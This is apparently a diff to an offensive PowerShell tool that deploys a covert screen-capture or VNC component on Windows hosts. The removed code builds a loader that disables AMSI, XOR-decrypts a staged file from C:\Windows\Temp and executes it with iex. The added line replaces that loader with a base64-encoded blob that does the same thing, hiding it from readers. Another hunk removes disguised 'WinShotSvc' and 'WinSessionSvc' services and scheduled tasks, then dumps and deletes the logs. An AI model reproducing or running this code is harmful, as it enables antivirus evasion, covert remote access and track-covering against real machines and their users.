@@ -69,16 +69,7 @@ public class WTS {
         $xb = New-Object System.Byte[] $tb.Length
         for ($i = 0; $i -lt $tb.Length; $i++) { $xb[$i] = $tb[$i] -bxor $key[$i % 16] }
         $xb64 = [System.Convert]::ToBase64String($xb)
-        $keycsv = ($key | ForEach-Object { '0x' + $_.ToString('x2') }) -join ','
-
-        $pay = "try { [Ref].Assembly.GetType(('System.Management.Automation.' + 'A' + 'msi' + 'Utils')).GetField(('a' + 'msi' + 'Init' + 'Failed'), 'NonPublic,Static').SetValue(`$null, `$true) } catch { Add-Content 'C:\Windows\Temp\vnclog.txt' ('PAYLOAD AMSI ERR: ' + `$_.Exception.Message) }; " +
-               "Add-Content 'C:\Windows\Temp\vnclog.txt' 'PAYLOAD STARTING'; " +
-               "`$k = @($keycsv); " +
-               "`$b = [Convert]::FromBase64String([IO.File]::ReadAllText('C:\Windows\Temp\vncb64.txt')); " +
-               "`$x = New-Object System.Byte[] `$b.Length; " +
-               "for (`$i = 0; `$i -lt `$b.Length; `$i++) { `$x[`$i] = `$b[`$i] -bxor `$k[`$i % 16] }; " +
-               "try { iex ([Text.Encoding]::UTF8.GetString(`$x)) } catch { Add-Content 'C:\Windows\Temp\vnclog.txt' ('PAYLOAD ERR: ' + `$_.Exception.Message) }"
-        $pe = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($pay))
+        $pe = 'dAByAHkAIAB7ACAAWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AJwAgACsAIAAnAEEAJwAgACsAIAAnAG0AcwBpACcAIAArACAAJwBVAHQAaQBsAHMAJwApACkALgBHAGUAdABGAGkAZQBsAGQAKAAoACcAYQAnACAAKwAgACcAbQBzAGkAJwAgACsAIAAnAEkAbgBpAHQAJwAgACsAIAAnAEYAYQBpAGwAZQBkACcAKQAsACAAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAAsACAAJAB0AHIAdQBlACkAIAB9ACAAYwBhAHQAYwBoACAAewAgAEEAZABkAC0AQwBvAG4AdABlAG4AdAAgACcAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXAB2AG4AYwBsAG8AZwAuAHQAeAB0ACcAIAAoACcAUABBAFkATABPAEEARAAgAEEATQBTAEkAIABFAFIAUgA6ACAAJwAgACsAIAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAgAH0AOwAgAEEAZABkAC0AQwBvAG4AdABlAG4AdAAgACcAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXAB2AG4AYwBsAG8AZwAuAHQAeAB0ACcAIAAnAFAAQQBZAEwATwBBAEQAIABTAFQAQQBSAFQASQBOAEcAJwA7ACAAJABrACAAPQAgAEAAKAAwAHgANAAyACwAMAB4ADMANwAsADAAeAAxADEALAAwAHgANQBjACwAMAB4ADkAZQAsADAAeAA2AGQALAAwAHgAMgAwACwAMAB4ADcANwAsADAAeAA4ADQALAAwAHgAMwAzACwAMAB4AGEAMQAsADAAeAAwADgALAAwAHgAZgAwACwAMAB4ADYAMwAsADAAeAA1AGIALAAwAHgAMgA5ACkAOwAgACQAYgAgAD0AIABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsASQBPAC4ARgBpAGwAZQBdADoAOgBSAGUAYQBkAEEAbABsAFQAZQB4AHQAKAAnAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAdgBuAGMAYgA2ADQALgB0AHgAdAAnACkAKQA7ACAAJAB4ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEIAeQB0AGUAWwBdACAAJABiAC4ATABlAG4AZwB0AGgAOwAgAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGIALgBMAGUAbgBnAHQAaAA7ACAAJABpACsAKwApACAAewAgACQAeABbACQAaQBdACAAPQAgACQAYgBbACQAaQBdACAALQBiAHgAbwByACAAJABrAFsAJABpACAAJQAgADEANgBdACAAfQA7ACAAdAByAHkAIAB7ACAAaQBlAHgAIAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAHgAKQApACAAfQAgAGMAYQB0AGMAaAAgAHsAIABBAGQAZAAtAEMAbwBuAHQAZQBuAHQAIAAnAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAdgBuAGMAbABvAGcALgB0AHgAdAAnACAAKAAnAFAAQQBZAEwATwBBAEQAIABFAFIAUgA6ACAAJwAgACsAIAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAgAH0A'
 
         $engine = "function L { Param(`$m) Add-Content -Path 'C:\Windows\Temp\sslog.txt' -Value `$m }`n" +
 "try { L 'ENGINE STARTED' } catch { exit 1 }`n" +
@@ -136,9 +127,11 @@ public class WTS {
             Unregister-ScheduledTask -TaskName 'WinSS' -Confirm:$false -Force -ErrorAction SilentlyContinue
             sc.exe stop WinShotSvc | Out-Null; sc.exe stop WinSessionSvc | Out-Null
             sc.exe delete WinShotSvc | Out-Null; sc.exe delete WinSessionSvc | Out-Null
-            Remove-Item 'C:\Windows\Temp\ss.ps1','C:\Windows\Temp\vncb64.txt' -Force -ErrorAction SilentlyContinue
+            Remove-Item 'C:\Windows\Temp\ss.ps1','C:\Windows\Temp\vncb64.txt','C:\Windows\Temp\vnc.ps1' -Force -ErrorAction SilentlyContinue
+            'SSLOG:'
+            if (Test-Path 'C:\Windows\Temp\sslog.txt') { Get-Content 'C:\Windows\Temp\sslog.txt'; Remove-Item 'C:\Windows\Temp\sslog.txt' -Force -ErrorAction SilentlyContinue } else { 'NO SSLOG' }
             'VNCLOG:'
-            if (Test-Path 'C:\Windows\Temp\vnclog.txt') { Get-Content 'C:\Windows\Temp\vnclog.txt' } else { 'NO VNCLOG' }
+            if (Test-Path 'C:\Windows\Temp\vnclog.txt') { Get-Content 'C:\Windows\Temp\vnclog.txt'; Remove-Item 'C:\Windows\Temp\vnclog.txt' -Force -ErrorAction SilentlyContinue } else { 'NO VNCLOG' }
         }
     }
 
